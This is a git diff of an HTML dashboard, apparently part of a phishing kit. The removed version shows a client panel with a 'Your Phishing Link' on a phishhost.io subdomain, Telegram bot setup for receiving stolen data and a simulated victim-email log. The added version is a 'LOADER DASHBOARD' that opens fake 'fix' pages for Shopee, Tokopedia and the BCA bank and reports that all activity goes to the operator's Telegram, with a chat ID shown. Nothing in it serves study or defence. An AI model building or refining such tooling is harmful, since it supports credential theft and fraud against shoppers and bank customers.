@@ -1,73 +1,176 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🌀 LOADER DASHBOARD</title>
     <style>
-        body{font-family:Arial;margin:15px;background:#f5f5f5;}
-        .card{background:white;padding:20px;margin:10px 0;border-radius:10px;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
-        input{width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:5px;}
-        button{background:#42b549;color:white;border:none;padding:12px;width:100%;border-radius:5px;font-weight:bold;}
-        .stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0f0f0f;
+            color: #e0e0e0;
+            margin: 0;
+            padding: 20px;
+        }
+        .dashboard {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            border-bottom: 2px solid #333;
+            padding-bottom: 20px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+        }
+        .card {
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 25px;
+            transition: transform 0.3s;
+            border: 1px solid #333;
+        }
+        .card:hover {
+            transform: translateY(-5px);
+            border-color: #666;
+        }
+        .card-shopee { border-top: 4px solid #ee4d2d; }
+        .card-tokopedia { border-top: 4px solid #41b549; }
+        .card-bca { border-top: 4px solid #0165A3; }
+        
+        .card-title {
+            font-size: 20px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .status {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .status-online { background: #2ecc71; }
+        .status-offline { background: #e74c3c; }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: #2c3e50;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            opacity: 0.9;
+        }
+        .btn-shopee { background: #ee4d2d; }
+        .btn-tokopedia { background: #41b549; }
+        .btn-bca { background: #0165A3; }
+        
+        .telegram-panel {
+            background: #0088cc;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 30px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>👋 Welcome, <span id="clientId">CLIENT001</span></h2>
-        <div class="stats">
-            <div>📊 Today: <span id="today">0</span></div>
-            <div>💰 Plan: <span id="plan">BASIC</span></div>
+    <div class="dashboard">
+        <div class="header">
+            <h1>🌀 LOADER DASHBOARD</h1>
+            <p>Quick Access to All Loaders</p>
+        </div>
+        
+        <div class="grid">
+            <!-- SHOPEE CARD -->
+            <div class="card card-shopee">
+                <div class="card-title">
+                    <span class="status status-online"></span>
+                    🛒 SHOPEE
+                </div>
+                <p>Fast loader dengan auto-clear cache</p>
+                <button class="btn btn-shopee" onclick="window.open('shopee-fix.html', '_blank')">
+                    ⚡ OPEN LOADER
+                </button>
+                <button class="btn" onclick="window.open('https://shopee.co.id', '_blank')">
+                    🌐 DIRECT LINK
+                </button>
+            </div>
+            
+            <!-- TOKOPEDIA CARD -->
+            <div class="card card-tokopedia">
+                <div class="card-title">
+                    <span class="status status-online"></span>
+                    🛍️ TOKOPEDIA
+                </div>
+                <p>Terminal-style minimal loader</p>
+                <button class="btn btn-tokopedia" onclick="window.open('tokopedia-fix.html', '_blank')">
+                    ⚡ OPEN LOADER
+                </button>
+                <button class="btn" onclick="window.open('https://tokopedia.com', '_blank')">
+                    🌐 DIRECT LINK
+                </button>
+            </div>
+            
+            <!-- BCA CARD -->
+            <div class="card card-bca">
+                <div class="card-title">
+                    <span class="status status-online"></span>
+                    🏦 BCA
+                </div>
+                <p>Secure banking loader</p>
+                <button class="btn btn-bca" onclick="window.open('bca-fix.html', '_blank')">
+                    ⚡ OPEN LOADER
+                </button>
+                <button class="btn" onclick="window.open('https://bca.co.id', '_blank')">
+                    🌐 DIRECT LINK
+                </button>
+            </div>
+        </div>
+        
+        <div class="telegram-panel">
+            <h3>📡 TELEGRAM MONITORING ACTIVE</h3>
+            <p>All activities are logged to your Telegram</p>
+            <small>Bot: 8455••••••• | Chat ID: 8313500840</small>
         </div>
     </div>
-    
-    <div class="card">
-        <h3>🔗 Your Phishing Link</h3>
-        <input type="text" id="phishLink" readonly value="Loading...">
-        <button onclick="copyLink()">📋 Copy Link</button>
-    </div>
-    
-    <div class="card">
-        <h3>🤖 Telegram Setup</h3>
-        <p>1. Add <code id="botName">@Client001_bot</code></p>
-        <p>2. Send <code>/start</code></p>
-        <p>3. Data will arrive automatically</p>
-    </div>
-    
-    <div class="card">
-        <h3>📈 Recent Activity</h3>
-        <div id="activityLog">No activity yet</div>
-    </div>
-    
+
     <script>
-    // Get client ID from URL
-    const urlParams = new URLSearchParams(window.location.search);
-    const clientId = urlParams.get('id') || 'CLIENT001';
-    
-    // Update display
-    document.getElementById('clientId').textContent = clientId;
-    document.getElementById('phishLink').value = `https://${clientId}.phishhost.io`;
-    document.getElementById('botName').textContent = `@${clientId}_bot`;
-    
-    // Simple localStorage for demo
-    let activity = JSON.parse(localStorage.getItem(`activity_${clientId}`) || '[]');
-    
-    function updateActivity() {
-        document.getElementById('activityLog').innerHTML = 
-            activity.slice(-5).map(a => `<div>${a.time}: ${a.email}</div>`).join('');
-    }
-    
-    // Simulate new data
-    setInterval(() => {
-        if (Math.random() > 0.7) {
-            activity.push({
-                time: new Date().toLocaleTimeString(),
-                email: `user${Math.floor(Math.random()*1000)}@test.com`
-            });
-            localStorage.setItem(`activity_${clientId}`, JSON.stringify(activity));
-            updateActivity();
+        // Test semua koneksi
+        async function testConnections() {
+            const sites = [
+                {name: 'Shopee', url: 'https://shopee.co.id'},
+                {name: 'Tokopedia', url: 'https://tokopedia.com'},
+                {name: 'BCA', url: 'https://bca.co.id'}
+            ];
+            
+            for(let site of sites) {
+                try {
+                    await fetch(site.url, {mode: 'no-cors'});
+                    console.log(`${site.name}: ✅`);
+                } catch {
+                    console.log(`${site.name}: ❌`);
+                }
+            }
         }
-    }, 5000);
-    
-    updateActivity();
+        
+        // Test saat load
+        window.onload = testConnections;
     </script>
 </body>
 </html>
